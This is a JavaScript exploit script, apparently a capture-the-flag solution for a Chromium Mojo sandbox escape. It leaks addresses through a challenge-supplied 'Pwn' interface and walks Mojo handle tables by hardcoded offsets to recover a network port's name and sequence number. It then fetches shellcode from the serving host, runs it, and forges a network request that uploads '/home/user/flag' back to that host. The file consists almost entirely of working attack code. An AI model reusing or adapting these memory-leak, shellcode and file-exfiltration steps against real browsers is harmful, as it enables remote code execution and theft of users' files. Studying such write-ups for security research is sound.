/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     https://www.apache.org/licenses/LICENSE-2.0
 *
 *     Unless required by applicable law or agreed to in writing, software
 *     distributed under the License is distributed on an "AS IS" BASIS,
 *     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *     See the License for the specific language governing permissions and
 *     limitations under the License.
 */
BigInt.prototype.hex = function() {
  return '0x'+this.toString(16);
}

// x/a thisPtr
const kPwnVtableOff = 0xa0d2950n;

// p/x &'(anonymous namespace)::g_system_network_context_manager'
const kSystemNetworkContextManagerOff = 0xa747450n;

// disassemble 'SystemNetworkContextManager::GetURLLoaderFactory'
// at the end of the fn: mov    rax,QWORD PTR [r13+0x168]
// Remote<URLLoaderFactory> is at off 0x140
// mojo handle can be found in the Router
const kRouterOff = 0x140n;

// Part of the connector, just search for the Connector vtable and just below should be the handle
const kHandleOff = 0x78n;

// == mojo ==

// x/a &'(anonymous namespace)::g_core'
const kMojoCoreOff = 0xa71ec30n;

// HandleTable is a member
const kHandleTableOff = 0x40n;

// includes a unordered_map<handle, Entry/dispatcher>
// first pointer is a bucket_list, second value the bucket count
// hash function is (prob) identity since handles are uint32_t
// finding an entry in the hashmap works like this:
// https://source.chromium.org/chromium/chromium/src/+/master:buildtools/third_party/libc++/trunk/include/__hash_table;drc=733e5f6811f84df058b5c6ac02e047098d4afdc1;l=2454
// if no collision, hash entry will be at
//  (bucket_list + 8*(hash % bucket_count)
//  but element too big? need to go one back (deref at off 0)
//  then nextptr at off 0
//  hash at off 8 and 16 (one is mod bucket_count?)
//  entry pointer at off 24
async function findInMap(pwn, mapAddr, val) {
  let bucketList = (await pwn.ptrAt(mapAddr+8n)).val;
  console.log(bucketList.hex());
  let bucketCount = (await pwn.ptrAt(mapAddr+0x10n)).val;
  console.log(bucketCount.hex());
  let bucket = (await pwn.ptrAt(bucketList+8n*(val%bucketCount))).val;
  bucket = (await pwn.ptrAt(bucket)).val;
  console.log('bucket: '+bucket.hex());
  return (await pwn.ptrAt(bucket+0x18n)).val;
}

// for sanity checking that we got the right entry
//const kMessagePipeDispatcherVtableOff = 0x9ee2978n;

// port ptr is right after portname (16 byte random)
const kPortOff = 0x28n;
// Success, now the format is
// * state (8B)
// * node_name (16B)
// * port_name (16B)
// * next_seq_num_to_send (8b)

async function prepareURLLoaderFactory() {
  let urlLoaderFactory = new network.mojom.URLLoaderFactoryPtr;
  Mojo.bindInterface(network.mojom.URLLoaderFactory.name, mojo.makeRequest(urlLoaderFactory).handle, 'process');
  for (let i = 0; i < 0x1337; i++) {
    await urlLoaderFactory.clone(mojo.makeRequest(new network.mojom.URLLoaderFactoryPtr));
  }
  return urlLoaderFactory;
}

function timeout(ms) {
  return new Promise(r => setTimeout(r, ms));
}

async function leakPort() {
  let pwn = new content.mojom.PwnPtr();
  Mojo.bindInterface(content.mojom.Pwn.name, mojo.makeRequest(pwn).handle, 'process');
  let pwnPtr = (await pwn.this()).val;
  console.log(`pwnPtr: 0x${pwnPtr.toString(16)}`);
  let pwnVtable = (await pwn.ptrAt(pwnPtr)).val;
  console.log(`pwnVtable: 0x${pwnVtable.toString(16)}`);
  let binBase = pwnVtable - kPwnVtableOff;
  console.log('binBase: '+binBase.hex());

  let networkContextManagerAddr = (await pwn.ptrAt(binBase+kSystemNetworkContextManagerOff)).val;
  console.log('netman: '+networkContextManagerAddr.hex());
  let routerAddr = (await pwn.ptrAt(networkContextManagerAddr+kRouterOff)).val;
  if (routerAddr == 0n) {
    for (let i = 0; i < 10000; i+=100) {
      await timeout(100);
      routerAddr = (await pwn.ptrAt(networkContextManagerAddr+kRouterOff)).val;
      if (routerAddr != 0n) break;
    }
    if (routerAddr == 0n) throw 'routerAddr still 0';
  }
  console.log('router: '+routerAddr.hex());
  let handle = (await pwn.ptrAt(routerAddr+kHandleOff)).val;
  console.log(handle.hex());

  let mojoCoreAddr = (await pwn.ptrAt(binBase+kMojoCoreOff)).val;
  console.log('mojoCore: '+mojoCoreAddr.hex());
  let handleTableAddr = (await pwn.ptrAt(mojoCoreAddr+kHandleTableOff)).val;
  console.log('handleTable: '+handleTableAddr.hex());
  let entry = await findInMap(pwn, handleTableAddr, handle);
  let msgPipeDispVtable = (await pwn.ptrAt(entry)).val;
  //if (msgPipeDispVtable != binBase+kMessagePipeDispatcherVtableOff) {
  //  throw 'expected MessagePipeDispatcher, got ' + msgPipeDispVtable;
  //}

  let portAddr = (await pwn.ptrAt(entry+kPortOff)).val;
  //for (let i = 0n; i < 0x80n; i+=8n) {
  //  console.log((await pwn.ptrAt(portAddr+i)).val.hex());
  //}

  let port = {
    nodeName: [(await pwn.ptrAt(portAddr+0x08n)).val, (await pwn.ptrAt(portAddr+0x10n)).val],
    portName: [(await pwn.ptrAt(portAddr+0x18n)).val, (await pwn.ptrAt(portAddr+0x20n)).val],
    seqNr: (await pwn.ptrAt(portAddr+0x28n)).val
  }

  console.log(`port: {nodeName: ${port.nodeName[0].toString(16) + port.nodeName[1].toString(16)}, portName: ${port.portName[0].toString(16) + port.portName[1].toString(16)}, seqNr: ${port.seqNr}}`)

  return port;
}

async function patchPort(port) {
  let p1 = port.portName[0].toString(16);
  let p2 = port.portName[1].toString(16);
  let seqNr = port.seqNr.toString(16);
  let sc = await (await fetch(`/sc?p1=${p1}&p2=${p2}&seqnr=${seqNr}`)).arrayBuffer();
  Mojo.rce(sc);
}

function currentPort() {
  if (location.port) return Number.parseInt(location.port);
  if (location.scheme == 'https:') return 443;
  return 80;
}

async function doFetch(urlLoaderFactory) {
  let urlLoaderClient = new network.mojom.URLLoaderClientPtr;
  new mojo.Binding(
    network.mojom.URLLoaderClient,
    {},
    mojo.makeRequest(urlLoaderClient)
  );

  await urlLoaderFactory.createLoaderAndStart(
    mojo.makeRequest(new network.mojom.URLLoaderPtr),
    0,
    0,
    0,
    Object.assign(new network.mojom.URLRequest, {
      method: 'POST',
      url: Object.assign(new url.mojom.Url, {url: `${location.protocol}//${location.host}/log`}),
      siteForCookies: Object.assign(new network.mojom.SiteForCookies, {
        scheme: location.protocol.slice(0, -1),
        registrableDomain: location.hostname,
        schemefullySame: true
      }),
      referrer: Object.assign(new url.mojom.Url, {url: ''}),
      headers: Object.assign(new network.mojom.HttpRequestHeaders, {headers: []}),
      corsExemptHeaders: Object.assign(new network.mojom.HttpRequestHeaders, {headers: []}),
      requestBody: Object.assign(new network.mojom.URLRequestBody, {
        elements: [
          Object.assign(new network.mojom.DataElement, {
            type: network.mojom.DataElementType.kFile,
            buf: [],
            path: Object.assign(new mojoBase.mojom.FilePath, {
              path: '/home/user/flag'
            }),
            blobUuid: "",
            offset: 0,
            length: 1337,
            expectedModificationTime: Object.assign(new mojoBase.mojom.Time, {
              internalValue: 0
            })
          }),
        ],
        identifier: 1337,
        containsSensitiveInfo: false
      }),
      mode: network.mojom.RequestMode.kNoCors,
      requestInitiator: Object.assign(new url.mojom.Origin, {
        scheme: location.protocol.slice(0, -1),
        host: location.hostname,
        port: currentPort()
      }),
      credentialsMode: network.mojom.CredentialsMode.kInclude,
      customProxyPreCacheHeaders: Object.assign(new network.mojom.HttpRequestHeaders, {headers: []}),
      customProxyPostCacheHeaders: Object.assign(new network.mojom.HttpRequestHeaders, {headers: []}),
      requestedWithHeader: '',
      clientDataHeader: '',
      fetchIntegrity: '',
      transitionType: 0
    }),
    urlLoaderClient,
    {}
  );

}

async function uploadFlag(port, urlLoader) {
  console.log('patching port');
  await patchPort(port);
  console.log('port patched');
  await doFetch(urlLoader);
}

async function run() {
  let urlLoader = await prepareURLLoaderFactory();
  let port = await leakPort();
  await uploadFlag(port, urlLoader);
}

run();
